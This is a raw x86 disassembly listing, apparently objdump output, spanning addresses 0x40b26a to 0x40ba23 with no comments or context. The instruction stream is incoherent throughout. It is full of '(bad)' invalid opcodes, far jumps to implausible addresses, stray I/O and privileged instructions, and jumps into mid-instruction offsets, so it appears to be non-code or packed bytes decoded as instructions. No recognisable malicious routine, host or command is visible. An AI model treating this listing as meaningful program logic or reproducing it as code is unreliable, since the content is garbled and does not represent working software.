  40b26a:	stc    
  40b26b:	jge    0x40b2df
  40b26d:	jnp    0xdd4035ce
  40b273:	call   0xc3b349
  40b278:	fadd   st(0),st
  40b27a:	dec    esi
  40b27b:	ins    BYTE PTR es:[edi],dx
  40b27c:	stc    
  40b27d:	cmp    al,0x73
  40b27f:	push   ebp
  40b280:	mov    eax,0xf8028b
  40b285:	jne    0x40b248
  40b287:	mov    esi,ecx
  40b289:	mov    esp,DWORD PTR [ebp+0x2c]
  40b28c:	add    edi,DWORD PTR [ebp-0x24]
  40b28f:	sub    esp,eax
  40b291:	and    al,0x45
  40b293:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40b299:	sbb    al,0xee
  40b29b:	pop    esi
  40b29c:	call   0x80b2cc
  40b2a1:	fsubr  st,st(3)
  40b2a3:	sti    
  40b2a4:	add    BYTE PTR gs:[ecx],bh
  40b2a7:	add    eax,esp
  40b2a9:	add    DWORD PTR [esi],eax
  40b2ab:	rol    DWORD PTR [ebp+0x8],0x29
  40b2af:	mov    esp,eax
  40b2b1:	clc    
  40b2b2:	jne    0x40b329
  40b2b4:	mov    eax,0x8b0673
  40b2b9:	loopne 0x40b300
  40b2bb:	loopne 0x40b246
  40b2bd:	lods   al,BYTE PTR ds:[esi]
  40b2be:	int3   
  40b2bf:	inc    ebp
  40b2c0:	mov    DWORD PTR gs:[eax+edi*8],eax
  40b2c4:	add    al,0xc3
  40b2c6:	sub    ecx,DWORD PTR [ebp+0x47]
  40b2c9:	(bad)  
  40b2cb:	shr    BYTE PTR [ebp-0x1f],0xe8
  40b2cf:	add    eax,DWORD PTR [eax]
  40b2d1:	call   0x64273d6
  40b2d6:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40b2dc:	dec    esi
  40b2dd:	ins    DWORD PTR es:[edi],dx
  40b2de:	in     al,dx
  40b2df:	lea    eax,[eax]
  40b2e1:	inc    ebp
  40b2e2:	inc    ebp
  40b2e3:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40b2e9:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40b2f3:	and    al,0xdc
  40b2f5:	ror    DWORD PTR [edx+0x24],0xf7
  40b2f9:	or     BYTE PTR [ebp+0x4c],dh
  40b2fc:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40b300:	stos   BYTE PTR es:[edi],al
  40b301:	adc    edx,edi
  40b303:	inc    esp
  40b304:	add    edi,DWORD PTR [eax]
  40b306:	jne    0x40b2eb
  40b308:	mov    DWORD PTR [eax-0x7449db04],ecx
  40b30e:	cmp    ecx,DWORD PTR [edi]
  40b310:	sub    BYTE PTR [ebp-0x7e],dl
  40b313:	sar    ebp,0xb
  40b316:	jmp    FWORD PTR [edi+0x2400392a]
  40b31c:	sub    esi,DWORD PTR [ebx-0x73]
  40b31f:	mov    esp,DWORD PTR [ecx+edi*4]
  40b322:	mov    ecx,DWORD PTR [eax]
  40b324:	and    BYTE PTR [eax],al
  40b326:	jne    0x40b2f2
  40b328:	sub    ebp,ecx
  40b32a:	sbb    BYTE PTR [esi+0x32],ah
  40b32d:	dec    ebp
  40b32e:	push   ebp
  40b32f:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40b335:	ret    
  40b336:	mov    edx,ebp
  40b338:	leave  
  40b339:	sub    DWORD PTR [esi+0x24],ebx
  40b33c:	ret    0x2b
  40b33f:	pop    ax
  40b341:	push   ebp
  40b342:	rol    BYTE PTR [ebx],0xeb
  40b345:	add    DWORD PTR [ecx+0x6c0001],0x40
  40b34c:	jb     0x40b3a3
  40b34e:	ret    
  40b34f:	in     al,dx
  40b350:	jecxz  0x40b2dd
  40b352:	push   esi
  40b353:	xchg   esp,eax
  40b354:	jne    0x40b356
  40b356:	cmp    edx,DWORD PTR [esi+0x1c]
  40b359:	jne    0x40b33f
  40b35b:	mov    eax,DWORD PTR [ebp-0x77]
  40b35e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40b365:	mov    esi,DWORD PTR [ebp-0x75]
  40b368:	pop    esi
  40b369:	nop
  40b36a:	mov    eax,DWORD PTR [eax]
  40b36c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40b372:	add    al,0x0
  40b374:	inc    ebp
  40b375:	mov    eax,DWORD PTR [ebx]
  40b377:	mov    ebp,ebx
  40b379:	cmp    al,0xf
  40b37b:	or     al,al
  40b37d:	inc    ebp
  40b37e:	inc    ebp
  40b37f:	xor    eax,0x8bc89c8b
  40b384:	ins    BYTE PTR es:[edi],dx
  40b385:	cld    
  40b386:	add    BYTE PTR [edi+0x576c16c0],dh
  40b38c:	add    BYTE PTR [ecx-0x5],dl
  40b38f:	add    eax,0x17200
  40b394:	sbb    al,0x85
  40b396:	dec    esp
  40b397:	je     0x40b3d1
  40b399:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40b39d:	add    BYTE PTR [ebx],bh
  40b39f:	(bad)  
  40b3a0:	and    al,0x34
  40b3a2:	jae    0x40b340
  40b3a4:	mov    cl,cl
  40b3a6:	inc    DWORD PTR [esp]
  40b3a9:	push   ebp
  40b3aa:	shr    esp,0x8
  40b3ad:	in     al,dx
  40b3ae:	push   esp
  40b3af:	and    DWORD PTR [eax],0xffffffdc
  40b3b2:	retf   
  40b3b3:	(bad)  
  40b3b4:	mov    bh,0xe4
  40b3b6:	add    BYTE PTR [ebp+0x450ff8e9],dh
  40b3bc:	retf   0x4cf5
  40b3bf:	pushf  
  40b3c0:	and    bh,al
  40b3c2:	pop    ss
  40b3c3:	rcr    cl,1
  40b3c5:	test   DWORD PTR [eax],eax
  40b3c7:	clc    
  40b3c8:	add    BYTE PTR [ebp+0x2b],al
  40b3cb:	xor    eax,ecx
  40b3cd:	pushf  
  40b3ce:	add    eax,0xd001c7
  40b3d3:	add    eax,0x456cf8c0
  40b3d8:	inc    eax
  40b3d9:	push   ebx
  40b3da:	rcr    DWORD PTR [eax+0x4c0105],0x20
  40b3e1:	inc    ebp
  40b3e2:	fst    DWORD PTR [esi+0x29]
  40b3e5:	mov    eax,DWORD PTR [eax]
  40b3e7:	nop
  40b3e8:	rol    BYTE PTR [eax],0xc0
  40b3eb:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  40b3f1:	add    DWORD PTR [ebx-0x75f9af00],ecx
  40b3f7:	pop    ebp
  40b3f8:	add    DWORD PTR [ecx+0x758bf800],ecx
  40b3fe:	or     BYTE PTR [ebp-0xce8aca],al
  40b404:	mov    bl,BYTE PTR [eax]
  40b406:	add    DWORD PTR [ebp+0x0],edx
  40b409:	call   0xfff3b317
  40b40e:	add    DWORD PTR [edi],ecx
  40b410:	add    BYTE PTR [edi],al
  40b412:	push   cs
  40b413:	inc    ecx
  40b414:	or     BYTE PTR [ebx+0x18008901],0x8
  40b41b:	leave  
  40b41c:	dec    ecx
  40b41d:	dec    esi
  40b41e:	add    esi,DWORD PTR [ebp-0x39]
  40b421:	call   0xffe6a322
  40b426:	clc    
  40b427:	inc    ebp
  40b428:	inc    ebp
  40b429:	mov    ecx,DWORD PTR [edi]
  40b42b:	enter  0x49,0x35
  40b42f:	mov    ecx,DWORD PTR [eax]
  40b431:	xor    eax,0x79e0807
  40b436:	xor    bl,BYTE PTR [esi-0x743ecda2]
  40b43c:	or     al,0x1c
  40b43e:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40b445:	int3   
  40b446:	test   DWORD PTR [eax],eax
  40b448:	clc    
  40b449:	inc    edx
  40b44b:	mov    eax,DWORD PTR [eax]
  40b44d:	fmul   DWORD PTR [ebx+0x74ff8300]
  40b453:	sub    BYTE PTR [ebp-0x40],ah
  40b456:	add    BYTE PTR [esi+0x45],bl
  40b459:	leave  
  40b45a:	xor    eax,0xc78b9c18
  40b45f:	jl     0x40b441
  40b461:	add    BYTE PTR [ebp+0x458df88b],al
  40b467:	add    al,0x31
  40b469:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  40b470:	test   edx,esp
  40b472:	clc    
  40b473:	or     eax,DWORD PTR [ebp+0x40]
  40b476:	xor    eax,0x8b949f89
  40b47b:	inc    ebp
  40b47c:	sbb    al,0xbe
  40b47e:	mov    ecx,DWORD PTR [eax]
  40b480:	xchg   esp,eax
  40b481:	pop    es
  40b482:	add    dh,al
  40b484:	mov    esp,DWORD PTR [ebp+0x1c]
  40b487:	add    BYTE PTR [edi-0x62],dl
  40b48a:	mov    eax,0x30132
  40b48f:	mov    DWORD PTR [ebp-0x68],eax
  40b492:	mov    eax,DWORD PTR [ebp-0x74]
  40b495:	xor    eax,DWORD PTR [eax]
  40b497:	add    ecx,DWORD PTR [ebx-0xf637677]
  40b49d:	inc    ebp
  40b49e:	jge    0x40b4f0
  40b4a0:	mov    DWORD PTR [ebp-0xc],eax
  40b4a3:	xor    eax,eax
  40b4a5:	add    ecx,DWORD PTR [ebx]
  40b4a7:	push   eax
  40b4a8:	jne    0x40b4ef
  40b4aa:	mov    eax,DWORD PTR ds:0x3f001c
  40b4b0:	dec    DWORD PTR [ebx-0x7f74e375]
  40b4b6:	add    eax,DWORD PTR [ecx]
  40b4b8:	cmp    al,0x0
  40b4ba:	push   cs
  40b4bb:	inc    ebp
  40b4bc:	inc    ebp
  40b4bd:	add    al,0x85
  40b4bf:	add    BYTE PTR [edi+edi*8-0x1],dh
  40b4c3:	mov    ebx,DWORD PTR [esp+ecx*1]
  40b4c6:	mov    ebp,0x8bffff4d
  40b4cb:	mov    ebx,DWORD PTR [esp+esi*8]
  40b4ce:	sbb    al,0x1
  40b4d1:	inc    ebp
  40b4d2:	add    BYTE PTR [ebx-0x74a87700],cl
  40b4d8:	push   ecx
  40b4d9:	clc    
  40b4da:	add    eax,0x457218
  40b4df:	mov    eax,DWORD PTR [ebp+0x50]
  40b4e2:	jne    0x40b529
  40b4e4:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  40b4ea:	add    edi,eax
  40b4ec:	add    BYTE PTR [ebp+0x31],al
  40b4ef:	lea    eax,[eax+0x4501dc]
  40b4f5:	lea    edx,[eax-0x74]
  40b4f8:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  40b4fe:	ret    0xc7
  40b501:	mov    eax,DWORD PTR [eax+0xee011c]
  40b507:	add    BYTE PTR [eax],cl
  40b509:	push   eax
  40b50a:	inc    ebp
  40b50b:	inc    ebp
  40b50c:	add    DWORD PTR [ebx+0x8b98eb],ecx
  40b512:	test   edi,eax
  40b514:	jne    0x40b4a2
  40b516:	mov    eax,DWORD PTR [eax]
  40b518:	mov    eax,DWORD PTR [eax]
  40b51a:	push   eax
  40b51b:	pop    ebp
  40b51c:	inc    ebp
  40b51d:	dec    DWORD PTR [ebx+0x570ce48b]
  40b523:	rcl    BYTE PTR [ecx-0x40],1
  40b526:	xor    esi,DWORD PTR [eax]
  40b528:	add    DWORD PTR [ebp-0x70],0xffffff83
  40b52c:	mov    edi,0x8372fc
  40b531:	push   eax
  40b532:	(bad)  
  40b533:	jbe    0x40b57a
  40b535:	mov    ecx,DWORD PTR [ebx-0x39341714]
  40b53b:	ret    
  40b53c:	(bad)  
  40b53d:	dec    ebp
  40b53e:	inc    ebp
  40b53f:	jmp    0x40b4ce
  40b541:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40b548:	(bad)  
  40b549:	cld    
  40b54a:	(bad)  
  40b54b:	push   ebp
  40b54c:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  40b552:	add    BYTE PTR [ebx],bh
  40b554:	push   eax
  40b555:	push   eax
  40b556:	inc    ebp
  40b557:	jmp    0x3d900e7
  40b55c:	add    BYTE PTR [ebx+0x8ca0c7],cl
  40b562:	add    BYTE PTR [ebx-0x13cfd500],cl
  40b568:	inc    ebp
  40b569:	ret    
  40b56a:	mov    DWORD PTR [ebp-0x14],edx
  40b56d:	mov    edx,eax
  40b56f:	sub    BYTE PTR [ebp-0x2d],cl
  40b572:	mov    ecx,DWORD PTR [ebp-0x75]
  40b575:	mov    eax,esi
  40b577:	rol    BYTE PTR [eax],1
  40b579:	inc    ebp
  40b57a:	add    DWORD PTR [eax],eax
  40b57c:	inc    ebp
  40b57d:	add    BYTE PTR [ecx+0x18838beb],cl
  40b583:	clc    
  40b584:	inc    eax
  40b585:	jmp    0x8d45:0x74945589
  40b58c:	xor    ecx,DWORD PTR [eax]
  40b58e:	add    edx,DWORD PTR [ebp-0x77]
  40b591:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40b597:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  40b59e:	inc    ebp
  40b59f:	fdiv   DWORD PTR [ebx]
  40b5a1:	loop   0x40b5a6
  40b5a3:	(bad)  
  40b5a5:	add    BYTE PTR [ebp+0x55],al
  40b5a8:	add    eax,0xd8008b
  40b5ad:	jmp    0xcd80:0x621c818b
  40b5b4:	add    DWORD PTR [ebx],esi
  40b5b6:	add    BYTE PTR [ecx-0x63fbcdbb],al
  40b5bc:	add    BYTE PTR [ebp-0x77],dh
  40b5bf:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  40b5c5:	dec    ebp
  40b5c6:	inc    DWORD PTR [ebx]
  40b5c8:	test   DWORD PTR [ebx+0x108b0074],eax
  40b5ce:	sbb    BYTE PTR [ebp+0x65],dl
  40b5d1:	add    eax,DWORD PTR [eax]
  40b5d3:	mov    edi,DWORD PTR [eax-0x75]
  40b5d6:	add    ah,dl
  40b5d8:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  40b5df:	dec    ebp
  40b5e0:	mov    DWORD PTR [ebx-0xfc071c],eax
  40b5e6:	dec    ebp
  40b5e7:	call   0x55426376
  40b5ec:	inc    ebp
  40b5ed:	add    DWORD PTR [ebx+0x855fcf4],ecx
  40b5f3:	cmp    ecx,DWORD PTR [ebp-0x5c]
  40b5f6:	inc    eax
  40b5f7:	add    BYTE PTR [ecx+0x73],dl
  40b5fa:	jb     0x40b5ff
  40b5fc:	mov    esi,eax
  40b5fe:	cmp    al,0x50
  40b600:	retf   
  40b601:	mov    DWORD PTR [ecx+0x4500f0],eax
  40b607:	test   ebx,edx
  40b609:	andnps xmm6,XMMWORD PTR [edx+0x3]
  40b60d:	dec    DWORD PTR [ecx+0x51ecfc8b]
  40b613:	inc    ebp
  40b614:	add    eax,edi
  40b616:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  40b61d:	inc    ecx
  40b61e:	hlt    
  40b61f:	mov    DWORD PTR [eax],eax
  40b621:	xchg   esp,eax
  40b622:	add    BYTE PTR [ebp+0x7d],al
  40b625:	xor    eax,edx
  40b627:	add    edx,ecx
  40b629:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  40b62f:	mov    DWORD PTR [eax-0x64],edx
  40b632:	mov    DWORD PTR [ebp-0x8],eax
  40b635:	push   eax
  40b636:	push   ebp
  40b637:	inc    ebp
  40b638:	mov    DWORD PTR [ebx],esi
  40b63a:	call   0xf910b42
  40b63f:	inc    ebp
  40b640:	adc    al,BYTE PTR ds:0x810055
  40b646:	dec    DWORD PTR [ebx-0x7f76e400]
  40b64c:	aam    0x1
  40b64e:	push   ebp
  40b64f:	add    cl,al
  40b651:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40b658:	call   FWORD PTR [esi+edx*8]
  40b65b:	cmp    dl,0x1
  40b65e:	test   DWORD PTR [eax],eax
  40b660:	clc    
  40b661:	inc    ebp
  40b662:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40b668:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  40b66e:	cmp    edi,edi
  40b670:	je     0x40b642
  40b672:	mov    eax,DWORD PTR [ebp-0x4]
  40b675:	add    edx,DWORD PTR [ecx]
  40b677:	sbb    al,0x0
  40b679:	dec    ebp
  40b67a:	dec    ebp
  40b67b:	mov    DWORD PTR [ecx+0x4545011c],ecx
  40b681:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40b687:	add    DWORD PTR [edx],eax
  40b689:	add    BYTE PTR [ebp+0x45],cl
  40b68c:	jne    0x40b619
  40b68e:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40b695:	cmp    esp,esi
  40b697:	jb     0x40b62a
  40b699:	mov    eax,DWORD PTR [eax]
  40b69b:	mov    eax,DWORD PTR [eax]
  40b69d:	mov    edx,DWORD PTR [esp+edi*1]
  40b6a0:	inc    ebp
  40b6a1:	je     0x40b62e
  40b6a3:	push   eax
  40b6a4:	add    al,0x38
  40b6a6:	push   ebp
  40b6a7:	mov    DWORD PTR ds:[ecx],edi
  40b6aa:	in     al,0xc
  40b6ac:	shl    BYTE PTR [eax],cl
  40b6ae:	test   DWORD PTR [ecx],eax
  40b6b0:	call   DWORD PTR [edx]
  40b6b2:	inc    esi
  40b6b4:	inc    ebp
  40b6b5:	ror    BYTE PTR [ecx+0x45459011],1
  40b6bb:	jmp    0xff41b3c4
  40b6c0:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	loopne 0x40b655
  40b6ca:	(bad)  
  40b6cb:	sbb    al,0xc7
  40b6cd:	inc    ebp
  40b6ce:	inc    ebp
  40b6cf:	push   ebx
  40b6d0:	lea    edi,[eax+0x454fdc]
  40b6d6:	lea    ecx,[ecx-0x74a774]
  40b6dc:	or     BYTE PTR [edi-0x3a],dl
  40b6df:	js     0x40b6a8
  40b6e1:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  40b6e7:	inc    DWORD PTR [eax]
  40b6e9:	call   DWORD PTR [eax+0x79]
  40b6ec:	inc    ebp
  40b6ed:	add    BYTE PTR [ebx+0x859866],cl
  40b6f3:	(bad)  
  40b6f4:	(bad)  
  40b6f5:	dec    DWORD PTR [ebx-0x2f99f3b9]
  40b6fb:	test   DWORD PTR [ebp-0x1],eax
  40b6fe:	mov    edi,edi
  40b700:	add    al,0x0
  40b703:	add    ax,WORD PTR [ebp-0xb20004]
  40b70a:	inc    DWORD PTR [edx+0x14]
  40b70d:	add    BYTE PTR [eax],cl
  40b70f:	data16 jne 0x40b697
  40b712:	push   ebx
  40b713:	call   DWORD PTR [ebp-0x1]
  40b716:	mov    eax,eax
  40b718:	cld    
  40b719:	inc    bp
  40b71b:	test   DWORD PTR [ebp+0x45ff04ff],ecx
  40b721:	inc    eax
  40b722:	mov    eax,DWORD PTR [eax]
  40b724:	sbb    al,0x66
  40b726:	inc    ebp
  40b727:	test   DWORD PTR [ebx+0xff90ff],ecx
  40b72d:	ror    BYTE PTR [ebx-0x7f7ae39a],0xff
  40b734:	add    edi,edi
  40b736:	add    BYTE PTR [ebp+0x30],al
  40b739:	add    BYTE PTR [ecx],dh
  40b73b:	popw   ds
  40b73d:	test   DWORD PTR [edx],esi
  40b73f:	(bad)  
  40b740:	cmp    bh,bh
  40b742:	jbe    0x40b70b
  40b744:	lea    ecx,[ecx-0x7493c9]
  40b74a:	add    edi,DWORD PTR [eax+0x734f39]
  40b750:	mov    ecx,DWORD PTR [ecx-0x749175]
  40b756:	sub    edi,DWORD PTR [eax+0x89d003]
  40b75c:	mov    ecx,DWORD PTR [ecx-0x698f04]
  40b762:	(bad)  
  40b763:	mov    eax,0xecd755
  40b768:	in     al,dx
  40b769:	mov    DWORD PTR [eax],eax
  40b76b:	jb     0x40b76d
  40b76d:	inc    DWORD PTR [ebp-0x48]
  40b770:	mov    ecx,esp
  40b772:	sbb    al,0x0
  40b774:	push   esi
  40b775:	mov    DWORD PTR ds:0x66ff0074,ecx
  40b77b:	mov    DWORD PTR [ebp-0x7a0014],0xad7d8df8
  40b785:	add    bh,al
  40b787:	mov    WORD PTR [ebp-0xa6],ax
  40b78e:	mov    eax,0x354f45
  40b793:	pushf  
  40b794:	mov    DWORD PTR [ebp-0x7600fda4],ecx
  40b79a:	lea    edi,[eax+0x4]
  40b79d:	dec    DWORD PTR [ecx-0x1ba13a]
  40b7a3:	mov    BYTE PTR [ebx-0x7639af1b],0xe6
  40b7aa:	pusha  
  40b7ab:	(bad)  
  40b7ac:	jmp    edi
  40b7ae:	mov    eax,0xe84fc6
  40b7b3:	xor    ecx,DWORD PTR [ecx-0x169d3a]
  40b7b9:	xor    eax,DWORD PTR [ebx-0x76ff3a42]
  40b7bf:	add    BYTE PTR [esp+eax*2-0x1],ah
  40b7c3:	in     al,0xb8
  40b7c5:	mov    dh,0x4f
  40b7c7:	add    DWORD PTR [eax],0x49
  40b7ca:	mov    esi,ebx
  40b7cc:	data16 mov bh,bh
  40b7cf:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  40b7d6:	push   0xb845ffe3
  40b7db:	loope  0x40b82c
  40b7dd:	inc    ebp
  40b7de:	add    bl,dl
  40b7e0:	mov    DWORD PTR [ebp+0x6a],eax
  40b7e3:	out    dx,al
  40b7e4:	inc    DWORD PTR [ebp-0x75]
  40b7e7:	and    DWORD PTR [esi+0x45],esp
  40b7ea:	test   DWORD PTR [esi],ebp
  40b7ec:	inc    DWORD PTR [ebp-0x1]
  40b7ef:	jl     0x40b83a
  40b7f1:	leave  
  40b7f2:	add    BYTE PTR [esi+eiz*2-0x24],al
  40b7f6:	test   DWORD PTR [esi+0x49ff83ff],esi
  40b7fc:	outs   dx,DWORD PTR ds:[esi]
  40b7fd:	fiadd  WORD PTR [eax]
  40b7ff:	mov    BYTE PTR [esi-0x7d],ah
  40b802:	test   DWORD PTR [edi],eax
  40b804:	(bad)  
  40b805:	in     al,dx
  40b806:	inc    DWORD PTR [ebp+0x6c]
  40b809:	loope  0x40b80b
  40b80b:	inc    ebp
  40b80c:	data16 aam 0x85
  40b80f:	inc    ebp
  40b810:	(bad)  
  40b811:	call   0xe5bcfe15
  40b816:	add    BYTE PTR [ebp+0x66],al
  40b819:	fild   WORD PTR [ebp-0x1300bb]
  40b81f:	inc    ebp
  40b820:	inc    ebp
  40b821:	xlat   BYTE PTR ds:[ebx]
  40b822:	xor    al,0x45
  40b824:	pushf  
  40b825:	jl     0x40b7df
  40b827:	leave  
  40b828:	icebp  
  40b829:	inc    esp
  40b82a:	add    ah,dl
  40b82c:	mov    DWORD PTR [esi+0x49ff8376],esi
  40b832:	(bad)  
  40b833:	fdivrp st(0),st
  40b835:	mov    BYTE PTR [ebp+0x4708f883],al
  40b83b:	in     al,dx
  40b83c:	test   WORD PTR [ebp-0x1],ax
  40b843:	inc    ebp
  40b844:	inc    ebp
  40b845:	mov    edx,ebp
  40b847:	cld    
  40b848:	inc    ebp
  40b849:	out    dx,eax
  40b84a:	rcl    BYTE PTR [ebx],1
  40b84c:	inc    ebp
  40b84d:	mov    edi,edx
  40b84f:	mov    eax,DWORD PTR [ebp+0x54]
  40b852:	and    edi,edi
  40b854:	inc    ebp
  40b855:	cmp    ebp,DWORD PTR [esi]
  40b857:	jne    0x40b82b
  40b859:	mov    DWORD PTR [ebp-0x44],0xf8c9857c
  40b860:	retf   
  40b861:	inc    ebp
  40b862:	add    dl,ah
  40b864:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  40b86b:	xor    bl,0x1
  40b86e:	add    eax,DWORD PTR [eax]
  40b870:	inc    ecx
  40b871:	adc    BYTE PTR [eax],bl
  40b873:	test   ecx,edi
  40b875:	add    dh,BYTE PTR [edx+0x0]
  40b878:	mov    BYTE PTR [ebp-0x24],0x8b
  40b87c:	(bad)  
  40b87d:	jl     0x40b85c
  40b87f:	add    dh,al
  40b881:	mov    esi,ebx
  40b883:	mov    eax,esi
  40b885:	sbb    al,0xdf
  40b887:	add    dh,0x1
  40b88a:	loopne 0x40b88c
  40b88c:	(bad)  
  40b88d:	adc    cl,ah
  40b88f:	or     dh,al
  40b891:	inc    ebp
  40b892:	loop   0x40b875
  40b894:	xor    ebp,eax
  40b896:	(bad)  
  40b897:	(bad)  
  40b898:	or     eax,0x18ec0ff8
  40b89d:	jl     0x40b892
  40b89f:	inc    ebp
  40b8a0:	add    ebx,DWORD PTR [ecx+0x41]
  40b8a3:	adc    BYTE PTR [eax],bl
  40b8a5:	repnz stc 
  40b8a7:	xor    BYTE PTR [edx+0x35],0xc6
  40b8ab:	adc    ah,dl
  40b8ad:	dec    ecx
  40b8ae:	(bad)  
  40b8af:	repnz aad 0x45
  40b8b2:	(bad)  
  40b8b3:	mov    esi,edx
  40b8b5:	adc    al,0xc6
  40b8b7:	call   edi
  40b8b9:	(bad)  
  40b8ba:	(bad)  
  40b8bb:	adc    al,bl
  40b8bd:	inc    esi
  40b8bf:	push   eax
  40b8c0:	fld    DWORD PTR [ebp-0x3a]
  40b8c3:	mov    esi,0x7c608da
  40b8c8:	fcmovnb st,st(6)
  40b8ca:	xor    ebx,DWORD PTR [esi+0x30d328d]
  40b8d0:	(bad)  
  40b8d2:	sbb    BYTE PTR [ebp-0xd],al
  40b8d5:	add    DWORD PTR [ebx],0x66
  40b8d8:	inc    ecx
  40b8d9:	mov    ebx,DWORD PTR [eax]
  40b8db:	sbb    al,0xf9
  40b8dd:	xor    BYTE PTR [edx+0x1],0x8d
  40b8e1:	add    BYTE PTR [ebp+eax*4-0x1],dl
  40b8e5:	dec    DWORD PTR [ecx+0x4d00fcff]
  40b8eb:	add    BYTE PTR [eax+0x7145fc30],bh
  40b8f1:	inc    DWORD PTR [ecx]
  40b8f3:	mov    ecx,DWORD PTR [ebp-0x310010]
  40b8f9:	retf   
  40b8fa:	enter  0xe45,0x3b
  40b8fe:	inc    ebp
  40b8ff:	jne    0x40b936
  40b901:	mov    eax,ds:0x33c70b9c
  40b906:	mov    esp,0xf81585ef
  40b90b:	mov    ds:0x338b0b45,eax
  40b910:	mov    WORD PTR [edi-0x5cc68e00],cs
  40b916:	ud2    
  40b918:	xchg   ebp,eax
  40b919:	xor    eax,DWORD PTR [eax]
  40b91b:	dec    edx
  40b91c:	mov    eax,DWORD PTR [eax]
  40b91e:	sbb    al,0x83
  40b920:	cmp    ah,0x1
  40b923:	push   0x0
  40b925:	pop    eax
  40b926:	adc    BYTE PTR [ecx-0x7483bb],cl
  40b92c:	and    BYTE PTR [esi+0x0],0x85
  40b930:	mov    edi,edi
  40b932:	push   0xffffffff
  40b934:	(bad)  
  40b935:	mov    esp,esi
  40b937:	adc    ah,0x75
  40b93a:	in     eax,0x66
  40b93c:	inc    ebp
  40b93d:	inc    ebp
  40b93e:	fild   QWORD PTR [edx-0x29]
  40b941:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40b947:	inc    ebp
  40b948:	sub    BYTE PTR [edx+0x49],0x58
  40b94c:	jmp    0x752c:0x40868889
  40b953:	lea    ax,[ebp-0xc]
  40b957:	xor    eax,DWORD PTR [ebp-0x5f0078]
  40b95d:	mov    DWORD PTR [ebp-0x820076],eax
  40b963:	stos   DWORD PTR es:[edi],eax
  40b964:	mov    ebp,DWORD PTR [ebx-0x43a87414]
  40b96a:	push   ecx
  40b96b:	test   DWORD PTR [ebx],esi
  40b96d:	(bad)  
  40b96e:	mov    ebx,0xc072ff
  40b973:	push   ebp
  40b974:	ret    
  40b975:	(bad)  
  40b976:	mov    eax,eax
  40b978:	sbb    al,0xdf
  40b97a:	rcl    ah,0x50
  40b97d:	inc    ebp
  40b97e:	inc    ebp
  40b97f:	into   
  40b980:	mov    ebp,ebx
  40b982:	cwde   
  40b983:	mov    DWORD PTR [eax],0x10d3c7c8
  40b989:	call   0xdf41ff8d
  40b98e:	add    cl,ch
  40b990:	jmp    DWORD PTR [esi-0x75]
  40b993:	inc    ebp
  40b994:	or     BYTE PTR [edi],bh
  40b996:	rol    bh,1
  40b998:	dec    ebp
  40b999:	adc    BYTE PTR [ebx],dh
  40b99b:	inc    DWORD PTR [ebx]
  40b99d:	add    cl,BYTE PTR [ecx-0x3e174400]
  40b9a3:	push   ss
  40b9a4:	push   ds
  40b9a5:	add    dh,ch
  40b9a7:	test   DWORD PTR [ebx-0x1],esi
  40b9aa:	or     eax,0x22850bff
  40b9af:	(bad)  
  40b9b0:	out    dx,al
  40b9b1:	push   DWORD PTR [ebx-0x75]
  40b9b4:	add    eax,0x3357e9ec
  40b9b9:	push   ecx
  40b9ba:	out    dx,al
  40b9bb:	xor    esi,DWORD PTR [ebx+0x3]
  40b9be:	jmp    0x85bb13
  40b9c3:	and    DWORD PTR [ebp+0x44],0x0
  40b9c7:	mov    esp,DWORD PTR [eax]
  40b9c9:	sbb    al,0x66
  40b9cb:	add    BYTE PTR [ebp-0xff00ff],0x30
  40b9d2:	mov    DWORD PTR [ebp+0x7e],eax
  40b9d5:	(bad)  
  40b9d6:	inc    DWORD PTR [ebx-0xbadf9a]
  40b9dc:	push   0xffffffff
  40b9de:	pop    eax
  40b9df:	clc    
  40b9e0:	mov    DWORD PTR [eax],ecx
  40b9e2:	or     BYTE PTR [ecx-0x8aef8d],0x58
  40b9e9:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  40b9ef:	lea    esp,[esi+0x10]
  40b9f2:	inc    ebp
  40b9f3:	jmp    FWORD PTR [edx+0x50]
  40b9f6:	pop    eax
  40b9f7:	inc    ebp
  40b9f8:	mov    DWORD PTR [ebx],esi
  40b9fa:	mov    BYTE PTR [ebx],al
  40b9fc:	rcl    BYTE PTR [eax+0x45],0x85
  40ba00:	inc    WORD PTR [ebp-0x1]
  40ba04:	lea    ecx,[ebx-0x7f99e35f]
  40ba0a:	stos   BYTE PTR es:[edi],al
  40ba0b:	add    DWORD PTR [ebp+0x0],eax
  40ba0e:	mov    ecx,ecx
  40ba10:	adc    al,0x95
  40ba12:	(bad)  
  40ba13:	push   DWORD PTR [ebx]
  40ba15:	dec    DWORD PTR [ebp+0x45ffc095]
  40ba1b:	dec    esp
  40ba1d:	push   ebp
  40ba1e:	loopne 0x40b9a9
  40ba20:	(bad)  
  40ba21:	adc    al,0xc4
  40ba23:	call   ebx
